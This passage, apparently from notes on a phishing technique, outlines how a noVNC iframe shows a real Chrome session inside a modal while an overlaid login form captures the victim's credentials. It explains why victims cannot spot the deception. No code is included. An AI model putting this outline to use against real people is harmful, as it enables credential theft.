3. noVNC iframe with real Chrome VNC stream
4. Login popup overlaid on top

**Why It Works:**
- Victim sees "real" browser with their URL and session
- Cannot tell it is VNC inside a modal
- Credentials captured by overlay form
